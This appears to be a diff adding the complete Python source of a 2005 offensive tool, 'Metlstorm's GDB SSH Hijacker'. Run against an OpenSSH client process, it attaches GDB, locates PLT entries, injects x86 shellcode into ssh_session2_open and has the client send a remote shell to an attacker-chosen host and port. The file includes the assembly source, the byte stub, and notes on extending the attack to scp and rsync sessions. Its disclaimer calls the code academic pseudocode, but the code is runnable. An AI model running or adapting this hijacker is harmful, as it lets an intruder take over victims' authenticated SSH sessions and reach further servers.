@@ -1,0 +1,806 @@
+#!/usr/bin/python
+#
+#
+# Metlstorm's GDB SSH Hijacker
+# 	Requires Python, GDB. 
+#
+# Flames to metalstorm@storm.net.nz
+#
+#
+# Try:
+#	./ssh-jack
+#	Usage: ./ssh-jack pid host port
+#       	pid: process ID of target SSH client process
+# 		host/port: tcp socket where you'd like the shell delivered
+#
+# 	Attaches a debugger to the running SSH process, convinces it to give you a shell at the remote end.
+# 	Note that you must be able to ptrace the target pid; ie, be root or the same user.
+# 	Use netcat to listen for the incoming shell, or equivilent.
+#
+#
+# Support status:
+#
+# Reports about this list appreciated.
+#
+# Known to work on:
+#	OpenSSH_3.8.1p1 on Debian Sarge
+#	OpenSSH_3.5p1 on RH9
+#
+# Suspected to work on:
+#	OpenSSH_3.6.1p2 on RHEL3/WBEL3
+#
+# Known not working (yet):
+#	OpenSSH_3.4p1 on Debian Woody
+#	OpenSSH_3.9p1 on Suse 9.2
+#
+# Unlikey to ever work:
+#	OpenSSH-1.2.3 on Debian Potato	
+#
+# -----------------------------------------------------------------------------------------------
+# LICENSE:
+#  This document is covered by the GNU Free Documentation License. 
+#
+#      Copyright (c)  2005 Metalstorm.
+#      Permission is granted to copy, distribute and/or modify this document
+#      under the terms of the GNU Free Documentation License, Version 1.2
+#      or any later version published by the Free Software Foundation;
+#      with the Invariant Sections being "Disclaimer". A copy of the license
+#      is available at http://gnu.org in the section entitled "GNU Free Documentation License".
+#
+# DISCLAIMER:
+# This document ("Metlstorm's GDB SSH Hijacker") is a concise description of the concepts
+# described in the presentation "Trust Transience: Post Intrusion SSH Hijacking" by the same
+# author, expressed in python. Python is used here as a well understood pseudocode standard
+# and under no circumstances does the author provide this for the purpose of conversion of 
+# this pseudocode into an executable form. This document is for academic study of the concepts
+# discussed in the presentation only. 
+# -----------------------------------------------------------------------------------------------
+#
+#
+# Random notes:
+#
+# - The protocol *requires* that you be able to open multiple sessions to the server
+# - The protocol permits the server to open channels to the client, but reccomends you dont let it.
+# - Wouldn't it be a neat hack to trojan the openssh tree to enable server-to-client shells? Must go and read the code and see if it's not already!
+
+# - Note to self: The ssh_open_session2_metl fucking connects out, not listens. OMFG. I can't believe I spent two hours remember that I wrote "connect()" instead of "listen()". /me beats self around head
+# - And furthermore, what class of dumbass has a parameter "safe place" offset, and doesnt fucking make a note "Oh, and I was using value n for testing" instead of just assuming that he'll remember it 6 months later. DUMBASS!
+# - Further to the previous comment, I've been using one of the mainline points at 0x0804fb30 in my openssh, which is client_wait_until_can_do_something in the main client loop
+
+# - Wonder if this'd work over an SCP? I fucking bet it would. Ixnay on the scp-push backupay?
+#   Investigation suggests that yes it would, with some curls to address:
+# 	- SSH ignores SIGWINCH when it doesn't have a pty, so the SIGWINCH-return-from-select trick doesnt work. No biggie, because a non-human is likely to be actually doing something on the channel, so we'll get a packet within a reasonable time. Still, be nice to come up with a way to think of a better way to force a return from select. All other signals are bound to SIG_IGN, or to the quit function. Perhaps just give it a SIGQUIT, and clean up the flag when we get control, before it goes and quits. We just gotta find the global:
+#		static volatile sig_atomic_t received_signal = 0;
+# 	in the .bss, and set it back to 0; That'd do. Easiest plan is maybe breakpoint in the signal handler, raise a signal, and just skip the signal handler (yeah, the signal handler's simple; catching a break at entry, and then just telling gdb to return)
+#	- if global Buffer command is set to something, then in ssh_session, it sends that instead of asking for a shell. in the case of scp, this is set to run the server end of scp, so we end up talking to it instead of a shell. If we can find the command Buffer struct in the .bss, then we can set it's length to 0, and we'll get a shell. We dont even have to worry about restoring it really, because an SCP is never going to ask for another. Course, this a special case of the more general 'ssh being used to execute a remote command' case, which'd be quite a likely use we'll see for ssh in a fixed, non human environment (eg, rsync, cvs etc). 
+#
+
+# - Strategy for automating choice of safe place - there's a select in clientloop.c, it's the only call to select in the whole ssh binary, that I can see. That's a pretty safe place. We can ask gdb where select is, find the PLT & GOT entries for select, and then find the call to select, thus locating our safe place. That's step one of making this work on a generic ssh binary, perhaps. 
+# - Props to Silvio's Phrack 0x38 article.
+
+# - Finding the stubloc - theres only one instance of 'dup() in/out/err failed'. Find it in the data segment, find references to it's address. There should be one like this:
+
+# 804d9a0:       c7 04 24 e1 15 07 08    movl   $0x80715e1,(%esp)
+# 804d9a7:       e8 84 3f 01 00          call   8061930 <fatal>
+
+# So, given the address of the mov, find three js to it, separated by tests, and bang, the first test is
+# the end of stubloc.
+
+#        if (in < 0 || out < 0 || err < 0)
+# 804d885:       85 ff                   test   %edi,%edi
+# 804d887:       89 c3                   mov    %eax,%ebx
+# 804d889:       0f 88 11 01 00 00       js     804d9a0 <ssh_session2_open+0x160>
+# 804d88f:       85 f6                   test   %esi,%esi
+# 804d891:       0f 88 09 01 00 00       js     804d9a0 <ssh_session2_open+0x160>
+# 804d897:       85 c0                   test   %eax,%eax
+# 804d899:       0f 88 01 01 00 00       js     804d9a0 <ssh_session2_open+0x160>
+#                fatal("dup() in/out/err failed");
+
+VERSION="1.02"
+
+
+import sys
+import os
+import types
+import signal
+import time
+import socket
+
+# Local to the file now
+#import gdbmi
+
+import re
+
+# Disabled now we're not debugging
+#from conzole import prompt
+
+# Supress warning about hex constants with high bit set being negative. Yeah yeah, we fucking know.
+import warnings
+try:
+	warnings.simplefilter('ignore',FutureWarning)
+except AttributeError:
+	pass
+
+# ---- Staticly included gdbmi.py to make it easier to move around ----
+# GDB/mi. With such optimism I read the first bits of the docs. 
+# Then I read the rest, and wept.
+# This is GDB/some-mi, some-hi, some just plain hack. 
+# It vaugely works for what I need.
+# It's only partially my fault it sucks :p
+
+# Metl
+
+GDB="/usr/bin/gdb"
+
+class GDBMIAttachError(Exception):
+	pass
+
+try:
+	False
+except NameError:
+	False = 0
+	True = 1
+
+class gdbmi:
+	debug_level = 0 
+	
+	LOG="log"
+	CONSOLE="console"
+	TARGET="target"
+	RESULT="result"
+	MESSAGE="message"
+	ASYNC_EXEC="async_exec"
+
+	# Result codes from the mi
+	R_ERR="error"
+	R_RUN="running"
+	R_CONN="connected"
+	R_EXIT="exit"
+	R_DONE="done"
+	
+	def __init__(self):
+		self.i = None
+		self.o = None
+		self.REGNAMES = None
+		self.connected = False
+
+	def debug(self, data):
+		if self.debug_level >= 1:
+			print "DEBUG: %s" % data
+	
+	def write(self, data):
+		if self.connected:
+			self.o.write(data)
+			self.o.flush()
+			self.debug("Wrote: '%s'" % data)
+		else:
+			raise ValueError("Not connected")
+	
+	def command(self, command):
+		self.write("%s\n" % command)
+	
+	def readline(self):
+		if self.connected:
+			i = self.i.readline()
+			self.debug("Read: '%s'" % i )
+			return i
+		else:
+			raise ValueError("Not connected")
+	
+	def readResponse(self):
+		response = []
+		response.append(self.readline())
+		while response[-1] != "(gdb) \n":
+			response.append(self.readline())
+
+		r = {self.LOG:"", self.CONSOLE:"", self.TARGET:"", self.RESULT:"", self.MESSAGE:"", self.ASYNC_EXEC:""}
+		for line in response:
+			if line[0] == "&":
+				r[self.LOG] += line[1:]
+			elif line[0] == "~":
+				r[self.CONSOLE] += line[1:]
+			elif line[0] == "@":
+				r[self.TARGET] += line[1:]
+			elif line[0] == "*":
+				r[self.ASYNC_EXEC] += line[1:]
+			elif line[0] == "^":
+				for rc in [self.R_ERR, self.R_RUN, self.R_CONN, self.R_EXIT, self.R_DONE]:
+					if line[1:len(rc) + 1] == rc:
+						r[self.RESULT] = rc
+						break
+
+				r[self.MESSAGE] = line[len(rc) + 6:]
+
+		return r
+		
+	def connect(self, pid, bin):
+		if not self.connected:
+			if pid == None:
+				self.o, self.i = os.popen2("%s --interpreter=mi %s" % (GDB,bin))
+			else:
+				self.o, self.i = os.popen2("%s --interpreter=mi -p %d %s" % (GDB, pid, bin))
+
+			self.connected = True
+			r =self.readResponse()
+			if r["log"].find("ptrace: No such process") != -1:
+				raise GDBMIAttachError("Unable to attach to process %d: '%s'" % (pid, self.formatGDBOutput(r["log"])))
+		else:
+			raise ValueError("Already connected.")
+	
+	def formatGDBOutput(self, s):
+		"""Mangles the gdb escaping to something sensible"""
+		s = s.replace("\\\\","\\")
+		s = s.replace("\\n", "")
+		s = s.replace("\"","")
+		return s
+	
+	def disconnect(self):
+		self.command("-target-detach")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+	
+	
+	def getSymbolAddress(self, symbol):
+		""" Fucking unimplemented in gdbmi"""
+		self.command("info address %s" % symbol)
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			rx = re.search("0x[0-9a-fA-F]{1,8}", r[self.CONSOLE], re.MULTILINE)
+			if rx == None:
+				raise ValueError("Failed to find address in '%s'" % r[self.CONSOLE])
+			else:
+				return rx.group()
+			
+		else:
+			raise ValueError(r[self.MESSAGE])
+	
+	def insertBreak(self, addr):
+		self.command("-break-insert *%s" % addr)
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+	
+	def clearBreak(self, number):
+		self.command("-break-delete %d" % number)
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def getSection(self, section):
+		"""Returns the start and end addresses of the section named 'section'"""
+		self.command("info file")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			lines = r[self.CONSOLE].split("\n")
+			for l in lines:
+				rx = re.search("(?P<start>0x[0-9a-fA-F]{1,8}) - (?P<end>0x[0-9a-fA-F]{1,8}) is %s" % section, l)
+				if rx != None:
+					return (eval(rx.groupdict()["start"]), eval(rx.groupdict()["end"]))
+
+			raise ValueError("Unable to locate section '%s'" % section)
+				
+		else:
+			raise ValueError(r[self.MESSAGE])
+	
+	
+	def cont(self):
+		self.command("-exec-continue")
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_RUN:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+	def wait(self):
+		r = self.readResponse()
+		return r
+
+	def waitForBreak(self):
+		while True:
+			r = self.wait()
+			if r[self.ASYNC_EXEC] != "":
+				if r[self.ASYNC_EXEC].find("breakpoint-hit") != -1: 
+					break;
+			self.cont()
+		return r[self.ASYNC_EXEC]
+			
+
+	def getRegNames(self):
+		""" Gets and caches an array mapping x86 general purpose registers to their gdb reg number"""
+		if self.REGNAMES == None:
+			self.command("-data-list-register-names 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15")
+			r = self.readResponse()
+			if r[self.RESULT] == self.R_DONE:
+				# Sweet. It's a perfectly eval-able python list :D
+				self.REGNAMES = eval(r[self.MESSAGE][r[self.MESSAGE].find("=") + 1:])
+			else:
+				raise ValueError(r[self.MESSAGE])
+		
+		return self.REGNAMES
+
+
+	def getRegs(self):
+		regnames = self.getRegNames()
+		regvals = {}
+		for rn in range(len(regnames)):
+			self.command("-data-list-register-values x %d" % rn )
+			r = self.readResponse()
+			if r[self.RESULT] == self.R_DONE:
+				begin = r[self.MESSAGE].find("value=\"")
+				end = r[self.MESSAGE][begin + 8 :].find("\"")
+				regvals[regnames[rn]] = r[self.MESSAGE][begin+7:begin+8 + end]
+			else:
+				raise ValueError(r[self.MESSAGE])
+	
+		return regvals
+	
+	def getByte(self, addr, bytes=1):
+		"""Returns a byte from memory at addr"""
+		self.command("-data-read-memory %s x %d 1 %d" % (addr, bytes, bytes))
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			begin = r[self.MESSAGE].find("data=[\"")
+			end = r[self.MESSAGE][begin + 8 :].find("\"")
+			return r[self.MESSAGE][begin+7:begin+8 + end]
+		else:
+			raise ValueError(r[self.MESSAGE])
+	
+	def setByte(self, addr, value):
+		"""Sets a byte in memory at addr. That GDB/MI variable stuff is overkill for this."""
+		self.command("set var {char}%s=%s" % (addr, value))
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+	
+	def setEIP(self, value):
+		self.command("set var $eip=%s" % (value))
+		r = self.readResponse()
+		if r[self.RESULT] == self.R_DONE:
+			return True
+		else:
+			raise ValueError(r[self.MESSAGE])
+
+# --- End GDBMI ---
+
+
+
+def o():
+	"""Used for the inline debug shell, to singlestep"""
+	g.command("x/i $eip")
+	print g.readResponse()["console"]
+	g.command("nexti")
+	print g.readResponse()["console"]
+	g.command("x/32x $esp")
+	print g.readResponse()["console"]
+	print g.getRegs()
+
+def setWord(w, d,o):
+	"Sets d[:2] bytes to be word w"
+	for i in range(2):
+		d[o +i] = (w >> (i * 8)) & 0xff
+	
+def setDWord(w, d,o):
+	"Sets d[:4] bytes to be dword w"
+	for i in range( 4):
+		d[o + i] = (w >> (i * 8)) & 0xff
+
+def findInstruction(g, seg, regex):
+	"""Given range seg, walk it dissasembling, and match regex re against output"""
+	for i in range(seg[0], seg[1]):
+		g.command("x/i 0x%08x" % i)
+		r = g.readResponse()
+		rx = regex.search(r["console"])
+		#print r["console"]
+		if rx != None:
+			return i
+	
+	return None
+
+def findDataAddr(g, seg, s):
+	"""Given the data s, find it's offset in the segment seg"""
+
+	look = []
+	if type(s) == types.IntType:
+		for i in range(seg[0], seg[1]):
+			if s == eval(g.getByte(i,4)):
+				return i
+	else:
+		for i in range(seg[0], seg[1]):
+			d = eval(g.getByte(i))
+			look.append(chr(d))
+			if len(look) > len(s):
+				look=look[1:]
+		
+			l = 0
+			while l < len(look):
+				if look[l] != s[l]:
+					break
+				l += 1
+
+			if l == len(s):
+				return i - len(s) + 1
+	
+	return None
+
+def findPLTEntry(g, sym, got, plt):
+	"""Given the start/end of the got and plt sections, finds the address of the PLT entry for dynamically
+	linked symbol sym using debugger g."""
+	
+	# Okay, we could exec readelf.
+	# Or use the mostexcellent elfsh
+	# We could even just parse the rel.plt ourself.
+	# Or... I could just bruteforce it. Which'll work without binutils and elfsh, and is easier.
+	# I'll come back and make this more elegant. One day.
+
+	# First, we find our symbol in the GOT. 
+
+	gotentry = None
+	for i in range(got[0], got[1], 4):
+		if sym == eval(g.getByte(i,4)):
+			gotentry = i
+			#print "Found 0x%08x in GOT at 0x%08x" % (sym, i)
+			break
+	
+	if gotentry == None:
+		raise ValueError("Unable to locate 0x%08x in GOT" % sym)
+	
+	# Next, we find PLT entries that refer to this GOT entry
+	for i in range(plt[0] + 2, plt[1] - 2, 4):
+		if gotentry == eval(g.getByte(i,4)):
+			# Actual calls to the PLT talk to our jmp instruction...
+			pltentry = i - 2
+			#print "Found 0x%08x in PLT at 0x%08x" % (sym, pltentry)
+			break
+	if pltentry == None:
+		raise ValueError("Unable to locate 0x%08x in PLT" % gotentry)
+		
+	return (pltentry,gotentry)
+
+
+def usage(): 
+	print "Usage: %s pid host port" % (sys.argv[0])
+	print "       pid: process ID of target SSH client process"
+	print " host/port: tcp socket where you'd like the shell delivered"
+	print 
+	print " Attaches a debugger to the running SSH process, convinces it to give you a shell at the remote end."
+	print " Note that you must be able to ptrace the target pid; ie, be root or the same user."
+	print " Use netcat to listen for the incoming shell, or equivilent."
+	print " Version: %s" % VERSION
+	sys.exit(1)
+
+testmode = False
+if len(sys.argv) == 3:
+	if sys.argv[1] == "-t":
+		# Test mode. Just run the pattern matcher stuff.
+		bin = sys.argv[2]
+		testmode = True
+	else:
+		usage()
+
+elif len(sys.argv) < 4:
+	usage()
+else:
+	pid = int(sys.argv[1])
+	hostname = sys.argv[2]
+	port = int(sys.argv[3])
+
+
+g = gdbmi()
+
+if not testmode:
+	try:
+		bin = os.path.realpath("/proc/%d/exe"% pid)
+	except AttributeError:
+		bin = "/proc/%d/exe"% pid
+	print "Connecting to %s running as pid %d..." % (bin, pid)
+
+	try:
+		g.connect(pid, "/proc/%d/exe" % pid)
+		print "Connected"
+	except GDBMIAttachError, i:
+		print i
+		sys.exit(1)
+else:
+	try:
+		g.connect(None, bin)
+		print "Connected"
+	except GDBMIAttachError, i:
+		print i
+		sys.exit(1)
+
+if not testmode:
+	print "Ferreting out some useful symbols..."
+	syms = {}
+	for sym in ["socket", "connect", "select"]:
+		syms[sym] = eval(g.getSymbolAddress(sym))
+		print "Located libc symbol '%s' at 0x%08x" % (sym, syms[sym])
+
+sections = {}
+for section in [".got", ".plt", ".text", ".rodata"]:
+	sections[section] = g.getSection(section)
+	print "Located section '%s' 0x%08x to 0x%08x" % (section, sections[section][0], sections[section][1])
+
+if not testmode:
+	plt={}
+	got={}
+	for s in syms.keys():
+		plt[s],got[s] = findPLTEntry(g, syms[s], sections[".got"], sections[".plt"])
+		print "Resolved dynamic symbol '%s' at PLT: 0x%08x GOT: 0x%08x" % (s, plt[s], got[s])
+
+# Choose where we're going to break it the first time. 
+# There's only one call to select, in a good place, so that sounds like a winner.
+#select = findPLTEntry(g, syms["select"], sections[".got"], sections[".plt"])
+	safebreak = plt["select"]
+
+print "Locating stub injection point..."
+print "Phase 1: Find magic string in .rodata...",
+sys.stdout.flush()
+# Find the right place for us to inject the stub. 
+magic = "dup() in/out/err failed"
+#magic = "du"
+magicloc = findDataAddr(g, sections[".rodata"], magic)
+if magicloc == None:
+	print "NOT FOUND"
+	sys.exit(1)
+
+print "0x%08x" % magicloc
+
+print "Phase 2: Find where magic string is used...",
+sys.stdout.flush()
+printfloc = findDataAddr(g, sections[".text"], magicloc)
+if printfloc == None:
+	print "NOT FOUND"
+	sys.exit(1)
+print "0x%08x" % printfloc
+
+print "Phase 3: Find three jump 0x%08x instructions..." % (printfloc - 3),
+regex = re.compile("j.\s+0x%x" % (printfloc -3))
+js1 = findInstruction(g, (printfloc - 3 - 1024, printfloc - 3), regex) 
+if js1 == None:
+	print "NOT FOUND"
+	sys.exit(1)
+
+print "0x%08x" % js1,
+js2 = findInstruction(g, (js1 + 8, js1+9), regex) 
+if js2 == None:
+	print "NOT FOUND"
+	sys.exit(1)
+print "0x%08x" % js2,
+js3 = findInstruction(g, (js2 + 8, js2+9), regex) 
+if js3 == None:
+	print "NOT FOUND"
+	sys.exit(1)
+print "0x%08x" % js3
+
+print "Phase 4: Check that there's a test 4 bytes before JS1...",
+
+test = findInstruction(g, (js1 - 4, js1 - 3), re.compile("test"))
+if test == None:
+	print "NOT FOUND"
+	sys.exit(1)
+print "0x%08x" % test
+
+print "Phase 5: Determine size of local stack...",
+regex = re.compile("sub\s+\$(?P<sub>0x[0-9a-f]{1,2}),%esp")
+subesp = findInstruction(g, (js1 - 0x50, js1), regex)
+if subesp == None:
+	print "NOT FOUND"
+	sys.exit(1)
+print "at 0x%08x:" % subesp,
+g.command("x/i 0x%08x" % subesp)
+r = g.readResponse()
+rx = regex.search(r["console"])
+if rx == None:
+	print "NOT FOUND"
+	sys.exit(1)
+
+stacksize = eval(rx.groupdict()["sub"])
+
+print "%d bytes" % stacksize
+
+
+if testmode:
+	sys.exit(0)
+
+# Now, we want to generate some code that when patched into ssh_session2_open, replaces
+
+#	if (stdin_null_flag) {
+#		in = open(_PATH_DEVNULL, O_RDONLY);
+#	} else {
+#		in = dup(STDIN_FILENO);
+#	}
+#	out = dup(STDOUT_FILENO);
+#	err = dup(STDERR_FILENO); 
+
+# with:
+
+#	struct sockaddr_in sa;
+#
+#	in = socket(PF_INET, SOCK_STREAM, 0);
+#	sa.sin_family = AF_INET;
+#	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+#	sa.sin_port = htons(1337);
+#	connect(in, (struct sockaddr *)&sa, sizeof(sa));
+#
+#	out = dup(in);
+#	err = dup(out);
+
+# Patching in user configurable address/port. 
+
+# Here's what I fed nasm to generate below:
+"""
+; Magic stub code
+
+BITS 32
+
+; preamble. Redirected execution starts here
+
+pushf
+pusha
+call evil		; Do the evil.
+popa
+popf
+nop			; We drop a break here to catch the end 
+
+sa:
+sin_family: 	dw 2	; AF_INET
+sin_port: 	resw 1
+s_addr:		resd 1
+
+socket:
+	resd 1	; socket PLT entry
+connect:
+	resd 1	; connect PLT entry
+
+evil:
+	push ebp	; function start
+	mov ebp,esp
+	push edi
+	push esi
+	push ebx
+	sub esp,0x2c	; This is replaced at runtime, if necessary.
+
+	; Layout for later is
+	; in: 	edi
+	; out: 	esi
+	; err:	eax
+	; This does change between binaries, and isn't yet automatically
+	; fixed up. This is one of the reasons we're broken on SuSE at this point.
+	; Them and their crazy 0day gcc. I'm amazed it works at all.
+
+	push ebx
+	mov ebx,[ebp+4]	; get location of call, so we can find sa
+	inc ebx
+	inc ebx
+	inc ebx
+	
+	push 0
+	push 1
+	push 2
+	;call [socket]	; socket(PF_INET, SOCK_STREAM, 0)
+	call [ ebx + 8 ]
+	mov edi,eax	; socket return into 'in', which is in edi
+	add esp,0x0c
+
+	push 0x10	; sizeof(sockaddr_in)
+	push ebx	; (struct sockaddr *)&sa
+	push edi	; in
+	;call [connect]	; connect(in, (struct sockaddr *)&sa, sizeof(sa));
+	call [ebx + 0x0c]
+	add esp,0xc
+
+	pop ebx
+	mov eax,edi
+	mov esi,edi
+	
+	; and now we mesh with the rest of the function. 	
+"""
+
+#
+# pushf, pusha, call, popa, popf, nop (break-target), function
+# When we break, we point the eip at the beginning of this.
+# We whack a break into the nop after the popa,popf, so we can catch the return of the function. 
+# 
+#
+stub = [
+  0x9c, 0x60, 0xe8, 0x13, 0x00, 0x00, 0x00, 0x61, 0x9d, 0x90, 0x02, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x55, 0x89, 0xe5, 0x57, 0x56, 0x53, 0x81, 0xec, 0x00, 0x00,
+  0x00, 0x00, 0x53, 0x8b, 0x5d, 0x04, 0x43, 0x43, 0x43, 0x68, 0x00, 0x00,
+  0x00, 0x00, 0x68, 0x01, 0x00, 0x00, 0x00, 0x68, 0x02, 0x00, 0x00, 0x00,
+  0xff, 0x53, 0x08, 0x89, 0xc7, 0x81, 0xc4, 0x0c, 0x00, 0x00, 0x00, 0x68,
+  0x10, 0x00, 0x00, 0x00, 0x53, 0x57, 0xff, 0x53, 0x0c, 0x81, 0xc4, 0x0c,
+  0x00, 0x00, 0x00, 0x5b, 0x89, 0xf8, 0x89, 0xfe
+  ]
+
+stubloc = test - len(stub)
+
+print "Injection point located: 0x%08x" % stubloc
+
+print "Patching PLT locs and parameters into stub..."
+datastart =10 
+
+setWord(socket.AF_INET, stub, datastart)
+setWord(socket.htons(port), stub, datastart + 2)
+
+host = socket.inet_aton(socket.gethostbyname(hostname))
+stub[datastart + 4] = ord(host[0])
+stub[datastart + 5] = ord(host[1])
+stub[datastart + 6] = ord(host[2])
+stub[datastart + 7] = ord(host[3])
+
+setDWord(plt["socket"], stub,datastart + 0x08 )
+setDWord(plt["connect"], stub,datastart +0x0c)
+
+# Patch in stack size
+stub[datastart + 24] = stacksize
+
+dump = ""
+for b in range(len(stub)):
+	if not b % 16:
+		dump = "%s\n" % dump
+	dump = "%s0x%02x " % (dump , stub[b])
+
+print "Stub:%s" % dump
+
+print "Inserting breakpoint at safe place 0x%08x" % safebreak
+g.insertBreak(safebreak)
+
+print "Continuing execution."
+g.cont()
+
+print "Waiting for breakpoint..."
+print "Smacking it upside the head with a SIGWINCH to wake it up..."
+#TODO: Replace this with the SIGTERM + breakpoint/return signal_handler, so it works without a pty. 
+os.kill(pid, signal.SIGWINCH)
+g.waitForBreak()
+print "Saving EIP"
+oldeip = g.getRegs()["eip"]
+print "Saved EIP %s" % oldeip
+
+print "Saving %d bytes of code that we're about to overwrite at 0x%08x" % (len(stub), stubloc)
+oldcode = []
+for i in range(len(stub)):
+	oldcode.append(g.getByte("0x%08x" % (stubloc + i)))
+
+print "Injecting %d bytes of stub at 0x%08x" % (len(stub), stubloc)
+for i in range(len(stub)):
+	g.setByte("0x%08x" % (stubloc + i), "0x%02x" % stub[i])
+
+print "Clearing breakpoint"
+g.clearBreak(1)
+
+print "Setting new breakpoint at 0x%08x" % (stubloc + 9 ) # There's a nop here, specially for this purpose.
+g.insertBreak("0x%08x" % (stubloc + 9 ))
+print "Setting EIP to 0x%08x" % stubloc
+g.setEIP("0x%08x" % stubloc)
+print "Continuing execution."
+
+g.cont()
+print "Waiting for breakpoint..."
+g.waitForBreak()
+
+print "Returned from our stub! Woot!"
+print "Restoring %d bytes of old code that we overwrote at 0x%08x" % (len(stub), stubloc)
+for i in range(len(stub)):
+	g.setByte("0x%08x" % (stubloc + i), oldcode[i])
+
+print "Clearing break"
+g.clearBreak(2)
+print "Resetting EIP"
+g.setEIP(oldeip)
+print "Finished cleaning up, detaching from process."
+g.disconnect()
+
+print "Smacking it upside the head with a SIGWINCH to wake it up..."
+os.kill(pid, signal.SIGWINCH)
+print "Hope your shell arrived on %s:%d" % (hostname, port)
